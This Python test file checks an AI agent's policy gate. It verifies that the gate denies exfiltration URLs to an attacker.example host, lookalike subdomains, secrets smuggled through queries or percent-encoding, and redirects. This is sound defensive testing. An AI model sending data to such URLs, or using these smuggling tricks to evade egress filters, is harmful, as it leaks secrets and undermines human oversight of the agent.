"""Harness policy gate: deterministic DENY for egress exfiltration, RBAC tool misuse and secret leakage."""
import json
import unittest
from unittest import mock

import agent

FAKE_KEY = "nvapi" + "-" + "SYNTHETIC0TESTKEY"  # built at runtime: no key-shaped literal in the repo


def gate(role):
    return agent.PolicyGate(agent.APP_POLICY, role, auto_approve=True)


class PolicyGateTest(unittest.TestCase):
    def test_exfil_to_attacker_host_denied(self):
        ok, reason = gate("analyst").check("fetch_url", {"url": "https://attacker.example/exfil?data=secrets"})
        self.assertFalse(ok)
        self.assertIn("allowlist", reason)

    def test_allowlisted_host_permitted(self):
        ok, _ = gate("analyst").check("fetch_url", {"url": "https://nvd.nist.gov/vuln/detail/CVE-2024-3094"})
        self.assertTrue(ok)

    def test_lookalike_subdomain_denied(self):
        ok, _ = gate("analyst").check("fetch_url", {"url": "https://nvd.nist.gov.attacker.example/x"})
        self.assertFalse(ok)

    def test_viewer_cannot_issue_ticket_or_fetch(self):
        for tool in ["create_incident_ticket", "fetch_url", "check_permission"]:
            with self.subTest(tool=tool):
                ok, _ = gate("viewer").check(tool, {})
                self.assertFalse(ok)

    def test_secret_pattern_in_args_denied(self):
        ok, reason = gate("analyst").check("create_incident_ticket",
                                           {"title": "x", "severity": "low", "summary": "key " + FAKE_KEY})
        self.assertFalse(ok)
        self.assertIn("blocked pattern", reason)

    def test_doc_clearance_mapping(self):
        self.assertEqual(gate("viewer").doc_clearance, frozenset({"all"}))
        self.assertEqual(gate("hr").doc_clearance, frozenset({"all", "hr"}))
        self.assertNotIn("hr", gate("analyst").doc_clearance)

    def test_unknown_role_rejected(self):
        with self.assertRaises(SystemExit):
            gate("root")


class EgressUrlPolicyTest(unittest.TestCase):
    """Self-assessment gaps #4/#5: data smuggled to an allowlisted host, and redirects to attacker hosts."""

    def deny(self, url):
        ok, reason = gate("analyst").check("fetch_url", {"url": url})
        self.assertFalse(ok, f"expected DENY for {url}")
        return reason

    def test_self_assessment_probe_is_now_denied(self):
        self.deny("https://nvd.nist.gov/search?q=SECRET_DATA")  # was ALLOWED before hardening

    def test_query_smuggled_onto_valid_path_denied(self):
        reason = self.deny("https://nvd.nist.gov/vuln/detail/CVE-2024-3094?q=SECRET_DATA")
        self.assertIn("query parameter 'q'", reason)

    def test_unexpected_path_on_allowlisted_host_denied(self):
        self.assertIn("path", self.deny("https://nvd.nist.gov/upload/SECRET_DATA"))

    def test_percent_encoded_key_in_path_denied(self):
        encoded = FAKE_KEY.replace("-", "%2D")
        self.deny(f"https://cve.mitre.org/cgi-bin/cvename.cgi?name={encoded}")

    def test_high_entropy_token_denied_even_if_path_rule_is_widened(self):
        g = gate("analyst")
        g.cfg["egress_url_rules"]["nvd.nist.gov"]["path"] = ".*"  # simulate a mis-configured path rule
        ok, reason = g.check("fetch_url", {"url": "https://nvd.nist.gov/" + "Qm9ndXNTZWNyZXRWYWx1ZUZvclRlc3RpbmcxMjM0"})
        self.assertFalse(ok)
        self.assertIn("secret pattern", reason)

    def test_userinfo_and_plain_http_and_fragment_denied(self):
        self.assertIn("userinfo", self.deny("https://user:pw@nvd.nist.gov/vuln/detail/CVE-2024-3094"))
        self.assertIn("https only", self.deny("http://nvd.nist.gov/vuln/detail/CVE-2024-3094"))
        self.assertIn("fragment", self.deny("https://nvd.nist.gov/vuln/detail/CVE-2024-3094#x"))

    def test_legit_cve_lookups_allowed(self):
        for url in ["https://nvd.nist.gov/vuln/detail/CVE-2024-3094",
                    "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228"]:
            with self.subTest(url=url):
                ok, reason = gate("analyst").check("fetch_url", {"url": url})
                self.assertTrue(ok, reason)

    def test_redirect_is_never_followed(self):
        resp = mock.Mock(status_code=302, headers={"Location": "https://attacker.example/exfil"}, text="")
        with mock.patch.object(agent.requests, "get", return_value=resp) as get, \
             mock.patch.object(agent, "audit") as audit:
            out = json.loads(agent.tool_fetch_url("https://nvd.nist.gov/vuln/detail/CVE-2024-3094"))
        self.assertTrue(out["redirect_blocked"])
        self.assertEqual(get.call_count, 1)
        self.assertIs(get.call_args.kwargs["allow_redirects"], False)
        audit.assert_called_once()
        self.assertEqual(audit.call_args.args[0], "egress_redirect_blocked")


if __name__ == "__main__":
    unittest.main()
